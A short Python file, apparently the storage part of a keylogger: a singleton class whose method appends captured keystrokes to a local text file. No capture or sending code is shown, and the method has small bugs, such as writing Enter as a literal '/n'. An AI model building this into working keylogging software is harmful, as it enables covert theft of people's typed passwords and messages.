class EventStore:

    class __EventStore:
        def __init__(self, path):
            self.path = path
        def __str__(self):
            return repr(self) + self.path

    instance = None
    
    def __init__(self, path):
        if not EventStore.instance:
            EventStore.instance = EventStore.__EventStore(path)
        else:
            EventStore.instance.path = path
        
    def storeKey(key):
        path = EventStore.instance.path
        
        #open output.txt to read current keystrokes
        f = open(path, 'r+')
        buffer = f.read()
        f.close()
        
        #open output.txt to write current + new keystrokes
        f = open(path, 'w')
        keylogs = chr(key)
        if key == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()